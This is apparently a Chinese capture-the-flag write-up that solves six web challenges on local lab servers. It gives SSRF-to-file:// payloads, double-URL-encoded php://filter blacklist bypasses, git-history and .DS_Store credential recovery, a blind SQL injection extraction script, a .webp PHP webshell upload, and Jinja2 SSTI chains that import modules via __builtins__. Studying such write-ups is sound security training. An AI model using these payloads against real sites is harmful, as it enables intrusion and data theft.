## mygo!!!
题目有一个音乐播放界面，音乐下载后html文件一堆乱码，然后翻看源代码发现源码中明确提到 “通过 PHP 代理播放”，所有音频点击后都会请求：
`player.src = index.php?proxy=${encodeURIComponent(url)}`
这意味着：**所有音频文件并非直接访问，而是通过`index.php`这个代理脚本转发请求**。而 flag 按钮的`data-url`是`???`，本质是让我们 **找到正确的`proxy`参数值（即 flag 文件的真实 URL）**，再通过代理脚本获取 flag。
如果用file访问`index.php?proxy=file:///flag`提示`Only http:// URLs are allowed`所以只能用http://协议，`index.php?proxy=http://...` 很可能由服务端去 `file_get_contents($url)` 或 `curl` 抓取 URL。虽然不能直接读 `file://`，但可以让目标服务器去访问 **它自己**（localhost/127.0.0.1）或内网其他 HTTP 服务，从而把本地 web 可访问路径内容返回给你（典型 SSRF）。flag一般藏在flag   flag.txt  flag.php中一个一个试，最后通过`index.php?proxy=http://127.0.0.1/flag.php`访问到一个新界面
```php
<?php  
$client_ip = $_SERVER['REMOTE_ADDR']; 
// 1. 获取客户端IP
if ($client_ip !== '127.0.0.1' && $client_ip !== '::1') {    header('HTTP/1.1 403 Forbidden'); // 返回403禁止访问状态码
    echo "你是外地人，我只要\"本地\"人";  
    exit; // 终止脚本执行，后续代码不运行
// 2. 本地IP访问限制（核心拦截逻辑）
}  
  
highlight_file(__FILE__);  
if (isset($_GET['soyorin'])) {    $url = $_GET['soyorin']; // 4. CURL请求功能（核心漏洞点）
  
    echo "flag在根目录";// 关键提示：flag存储在服务器根目录   
    $ch = curl_init($url);// 获取参数值（用户可控）    
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, false); //
// 结果不存入变量，直接输出到浏览器直接输出给浏览器    
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);// 自动跟随302重定向    
    curl_setopt($ch, CURLOPT_BUFFERSIZE, 8192);// 设置缓冲区大小（不影响核心逻辑）    
    curl_exec($ch);  // 执行CURL请求，结果直接输出  
    curl_close($ch); 
    exit; // 终止脚本
}  
  
?>
```
服务器根目录是`/`,因为ctf用linux系统，又因为curl默认支持多种协议，包括`http://`、`https://`、`file://`、`ftp://`等，无需额外配置。所以可以用file://输出flag最终payloads是`index.php?proxy=http://127.0.0.1/flag.php?soyorin=file:///flag`得到flag
## ez-chain
```php
header('Content-Type: text/html; charset=utf-8');  
function filter($file) { 
$waf = array('/',':','php','base64','data','zip','rar','filter','flag');//黑名单过滤
    foreach ($waf as $waf_word) { //遍历黑名单检查 
        if (stripos($file, $waf_word) !== false) {  
            echo "waf:".$waf_word;//输出被拦截的关键词
            return false;  //拦截输入
        }  
    }  
    return true;  //允许输入
}
function filter_output($data) {  //输出函数  
$waf = array('f'); //黑名单，过滤"f",不区分大小写 
    foreach ($waf as $waf_word) {  
        if (stripos($data, $waf_word) !== false) {  
            echo "waf:".$waf_word;  
            return false;  
        }  
    }  
//递归Base64解码（直到无法解码或解码后不变）
    while (true) {        
    $decoded = base64_decode($data, true);// 第二个参数true：严格检查Base64格式 
        if ($decoded === false ||$decoded === $data) { // 解码失败或内容不变时停止
            break;  
        }        
        $data = $decoded;// 更新内容为解码后的值 
    }  
// 第二次检查解码后的内容
    foreach ($waf as $waf_word) {  
        if (stripos($data, $waf_word) !== false) {  
            echo "waf:".$waf_word;  
            return false;  
        }  
    }  
    return true;  
}  
  
if (isset($_GET['file'])) {    
$file = $_GET['file'];// 获取用户输入的文件路径
    if (filter($file) !== true) {  
        die(); 
    }    
    $file = urldecode($file); // 对file参数进行URL解码（关键：允许一次URL编码绕过）
    $data = file_get_contents($file);  
    if (filter_output($data) !== true) {  
        die();  
    }  
    echo $data;  
}  
highlight_file(__FILE__);  
  
?>
```
`stripos($file, $waf_word)`
- 作用：在`$file`中**不区分大小写**查找`$waf_word`的位置（如`Flag`、`FLAG`都会被`flag`拦截）。
- 返回值：找到则返回位置（整数），找不到返回`false`；`!== false`表示 “确实找到了关键词”
`?file=file:///flag`因为网页自动解码一次，php代码解码一次,所以要将file:///flag用url编码两次`?file=file%253a%252f%252f%252f%2566%256C%2561%2567`输出`waf:f`说明已经成功绕过输入过滤，读取到了`/flag`文件，但文件内容中包含`f`字符（比如`flag{xxx}`的开头`f`），被`filter_output`拦截并输出`waf:f`。
所以用`php://filter/read=string.rot13/resource=/flag`url编码两次
`?file=%2570%2568%2570%253a%252f%252f%2566%2569%256c%2574%2565%2572%252f%2572%2565%2561%2564%253d%2573%2574%2572%2569%256e%2567%252e%2572%256f%2574%2531%2533%252f%2572%2565%2573%256f%2575%2572%2563%2565%253d%252f%2566%256c%2561%2567`得到synt{n6p89734-4939-4281-n1o8-2p73s9rrooq9}用凯撒解密一下偏移量是13得到flag`flag{a6c89734-4939-4281-a1b8-2c73f9eebbd9}`   
## 小E的秘密计划
提示用的.git配置和备份文件，所以用dirsearch扫一下，扫到了备份文件，打开，进入`public-555edc76-9621-4997-86b9-01483a50293e`是一个登录界面，不可爆破，
login.php
```php
<?php
require_once 'user.php';
$userData = getUserData();
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    if ($username === $userData['username'] && $password === $userData['password']) {
        header('Location: /secret-xxxxxxxxxxxxxxxxxxx');
        exit();
    } else {
        echo '登录失败,在git里找找吧';
        exit();
    }
}
```
所以试一下还原git
```
C:\Users\Lenovo\Downloads\www (1)\public-555edc76-9621-4997-86b9-01483a50293e>git reset --hard
HEAD is now at 5fef682 删除提示

C:\Users\Lenovo\Downloads\www (1)\public-555edc76-9621-4997-86b9-01483a50293e>git log
commit 5fef682d7eceba025c894af4a5f8bf4680666368 (HEAD -> master)
Author: admin <admin@admin.com>
Date:   Wed Oct 1 12:14:25 2025 +0800

    删除提示

commit 5f8ecc03aee0de892013bba7ce0522876c419b58
Author: admin <admin@admin.com>
Date:   Wed Oct 1 12:14:08 2025 +0800

    新增提示

commit 1389b4798a8013a1c90fb2d867243d0da18c5175
Author: admin <admin@admin.com>
Date:   Wed Oct 1 12:10:02 2025 +0800

    初始化

C:\Users\Lenovo\Downloads\www (1)\public-555edc76-9621-4997-86b9-01483a50293e>git show 5fef682d7eceba025c894af4a5f8bf4680666368
commit 5fef682d7eceba025c894af4a5f8bf4680666368 (HEAD -> master)
Author: admin <admin@admin.com>
Date:   Wed Oct 1 12:14:25 2025 +0800

    删除提示

diff --git a/tips.txt b/tips.txt
deleted file mode 100644
index a7fa1d9..0000000
--- a/tips.txt
+++ /dev/null
@@ -1 +0,0 @@
-tips：什么是branch
\ No newline at end of file
```
看到提示`什么是branch`
`branch` 是版本控制系统的核心功能，指代码仓库中独立的开发线，用于**隔离不同开发任务**（新功能、bug 修复、应急补丁），避免互相干扰，CTF 中常出现在**代码溯源、漏洞复现**（分析漏洞分支的代码变更）场景。
CTF 相关操作：`git branch`（查看分支）、`git checkout branch-name`（切换分支）、`git merge branch-name`（合并分支），常用来分析**漏洞分支与正常分支的代码差异**，定位漏洞点。
在`.git/logs/HEAD`文件中发现其中隐含一个测试的`brach`,会被删除.
```
C:\Users\Lenovo\Downloads\www (1)\public-555edc76-9621-4997-86b9-01483a50293e>type .git\logs\HEAD
0000000000000000000000000000000000000000 1389b4798a8013a1c90fb2d867243d0da18c5175 admin <admin@admin.com> 1759291802 +0800      commit (initial): 初始化
1389b4798a8013a1c90fb2d867243d0da18c5175 1389b4798a8013a1c90fb2d867243d0da18c5175 admin <admin@admin.com> 1759291829 +0800      checkout: moving from master to test
1389b4798a8013a1c90fb2d867243d0da18c5175 353b98f7c2fe77a5a426bf73576f5113820c4669 admin <admin@admin.com> 1759291908 +0800      commit: 测试，这个branch会删
353b98f7c2fe77a5a426bf73576f5113820c4669 1389b4798a8013a1c90fb2d867243d0da18c5175 admin <admin@admin.com> 1759291930 +0800      checkout: moving from test to master
1389b4798a8013a1c90fb2d867243d0da18c5175 5f8ecc03aee0de892013bba7ce0522876c419b58 admin <admin@admin.com> 1759292048 +0800      commit: 新增提示
5f8ecc03aee0de892013bba7ce0522876c419b58 5fef682d7eceba025c894af4a5f8bf4680666368 admin <admin@admin.com> 1759292065 +0800      commit: 删除提示
5fef682d7eceba025c894af4a5f8bf4680666368 5fef682d7eceba025c894af4a5f8bf4680666368 admin <admin@admin.com> 1769422808 +0800      reset: moving to HEAD
```
列出文件的完整路径
```
C:\Users\Lenovo\Downloads\www (1)\public-555edc76-9621-4997-86b9-01483a50293e>git ls-tree -r --name-only 353b98f7c2fe77a5a426bf73576f5113820c4669
index.html
login.php
user.php
```
使用`git show commit -b`查看文件内容
```
C:\Users\Lenovo\Downloads\www (1)\public-555edc76-9621-4997-86b9-01483a50293e>git show 353b98f7c2fe77a5a426bf73576f5113820c4669 -b
commit 353b98f7c2fe77a5a426bf73576f5113820c4669
Author: admin <admin@admin.com>
Date:   Wed Oct 1 12:11:48 2025 +0800

    测试，这个branch会删

diff --git a/user.php b/user.php
new file mode 100644
index 0000000..f3d34d7
--- /dev/null
+++ b/user.php
@@ -0,0 +1,8 @@
+<?php
+
+function getUserData() {
+    return [
+        'username' => 'admin',
+        'password' => 'f75cc3eb-21e0-4713-9c30-998a8edb13de'
+    ];
+}
\ No newline at end of file
```
得到用户密码
登录成功。进入之后提示`mac`,所以是`.DS_Store`文件泄露,直接在当前路径拼接下载并查看内容:
.DS_Store 是**macOS 系统**（苹果电脑）中 Finder 程序自动生成的**隐藏配置文件**，全称是 `_Desktop Services Store_`（桌面服务存储文件）。
所以直接访问`http://localhost:7878/secret-1c84a90c-d114-4acd-b799-1bc5a2b7be50/.DS_Store`得到文件，再
```
C:\Users\Lenovo\Downloads>type DS_Store
Bud1
 �

DSDB@�@ @ @ffffllllaaaagggg114514Ilocblodd
```
所以访问`http://localhost:7878/secret-1c84a90c-d114-4acd-b799-1bc5a2b7be50/ffffllllaaaagggg114514`得到flag。
## 白帽小K的故事（2）
应该是sql注入，fuzz一下
```
空格 ? + / /**/ %20 %09 %0a
```
可以用()绕过空格过滤。
测试
```
name=amiya'and(1=1)#
```
回显ok
```
name=amiya'and(1=2)#
```
回显error，所以应该是布尔盲注了
hint:我记得后端的查询逻辑是：`SELECT 1 from Terra.animal WHERE name = '$name'`
```python
import requests  
  
url = "http://localhost:6565/search"  
def check(payload):  
    r = requests.post(url,data={"name":payload})  
    if '"status":"ok",' in r.text:  
        return True  
    else:  
        return False  
  
result = ""  
chars="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#&'()*+,-./:;<=>?@[\]^`{|}~"  
for i in range(1,100):  
    for c in chars:  
        # amiya'and(substr((select(database())),{i},1)='{c}')#  
        # amiya'and(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{i},1)='{c}')#        # amiya'and(substr((select(group_concat(column_name))from(information_schema.columns)where((table_schema=database())and(table_name='animals'))),{i},1)='{c}')#        # amiya'and(substr((select(group_concat(concat_ws('~',id,name,species,age)))from(animals)),{i},1)='{c}')#        # amiya'and(substr((select(group_concat(schema_name))from(information_schema.schemata)),{i},1)='{c}')#        # amiya'and(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='Flag')),{i},1)='{c}')#        # amiya'and(substr((select(group_concat(column_name))from(information_schema.columns)where((table_schema='Flag')and(table_name='flag'))),{i},1)='{c}')#        # amiya'and(substr((select(group_concat(flag))from(Flag.flag)),{i},1)='{c}')#        payload=f"amiya'and(substr((select(group_concat(flag))from(Flag.flag)),{i},1)='{c}')#"  
        if check(payload):  
            result +=c  
            break  
    print(result)
```
脚本爆出flag。
## mirror_gate
这是文件上传，可以看源码里有hint
```
|<!-- flag is in flag.php -->|
|<!-- HINT: c29tZXRoaW5nX2lzX2luXy91cGxvYWRzLw== -->|
```
解码后得到
```
something_is_in_/uploads/
```
所以dirsearch扫一下，
```
Target: http://localhost:7878/

[21:39:21] Starting: uploads/
[21:39:22] 200 -   38B  - /uploads/.htaccess

Task Completed
```
扫到一个.htaccess文件。
内容是
```
AddType application/x-httpd-php .webp
```
他会把`.webp`后缀的文件，解析为php。
一种方法是上传后缀为.webp的木马文件
```
<?=
phpinfo();
?>
```
访问就可以在环境变量里找到flag。
这里好像把`eval() exec() system()`等函数都禁止了。
也可以上传
```
<?=
include("/flag.php");
?>
```
访问也可以得到flag。
## who's ssti
源码
```python
from flask import Flask, jsonify, request, render_template_string, render_template  
import sys, random  
  
func_List = ["get_close_matches", "dedent", "fmean",   
             "listdir", "search", "randint", "load", "sum",   
             "findall", "mean", "choice"]  
need_List = random.sample(func_List, 5)  
need_List = dict.fromkeys(need_List, 0)  
BoleanFlag = False  
RealFlag = __import__("os").environ.get("ICQ_FLAG", "flag{test_flag}")  
# 清除 ICQ_FLAG__import__("os").environ["ICQ_FLAG"] = ""  
  
def trace_calls(frame, event, arg):  
  if event == 'call':  
    func_name = frame.f_code.co_name  
    # print(func_name)  
    if func_name in need_List:  
      need_List[func_name] = 1  
    if all(need_List.values()):  
      global BoleanFlag  
      BoleanFlag = True  
  return trace_calls  
  
  
app = Flask(__name__)  
@app.route('/', methods=["GET", "POST"])  
def index():  
  submit = request.form.get('submit')  
  if submit:  
    sys.settrace(trace_calls)  
    print(render_template_string(submit))  
    sys.settrace(None)  
    if BoleanFlag:  
      return jsonify({"flag": RealFlag})  
    return jsonify({"status": "OK"})  
  return render_template_string('''<!DOCTYPE html>  
<html lang="zh-cn">  
<head>  
    <meta charset="UTF-8">    <title>首页</title>  
</head>  
<body>  
    <h1>提交你的代码，让后端看看你的厉害！</h1>  
    <form action="/" method="post">        <label for="submit">提交一下：</label>  
        <input type="text" id="submit" name="submit" required>        <button type="submit">提交</button>  
    </form>    <div style="margin-top: 20px;">        <p> 尝试调用到这些函数！ </p>    {% for func in funcList %}        <p>{{ func }}</p>    {% endfor %}    <div style="margin-top: 20px; color: red;">        <p> 你目前已经调用了 {{ called_funcs|length }} 个函数：</p>  
        <ul>        {% for func in called_funcs %}            <li>{{ func }}</li>        {% endfor %}        </ul>    </div></body>  
<script>  
    </script>  
</html>  
  
                                '''                                ,   
                                funcList = need_List, called_funcs = [func for func, called in need_List.items() if called])  
  
if __name__ == '__main__':  
  app.run(host='0.0.0.0', port=5000, debug=False)
```
看到用的是render_template_string函数，所以不会渲染，但是只要调用到列表里的五个函数就可以得到flag。
所以通过找到`__builtins__`通过引入不同的模块来调用函数
```
{{config.__class__.__init__.__globals__.__builtins__.__import__('numpy').sum([1,2,3])}}
{{config.__class__.__init__.__globals__.__builtins__.__import__('statistics').fmean([1,2,3])}}
{{config.__class__.__init__.__globals__.__builtins__.__import__('re').search('a','abc')}}
{{config.__class__.__init__.__globals__.__builtins__.__import__('textwrap').dedent(' a')}}
```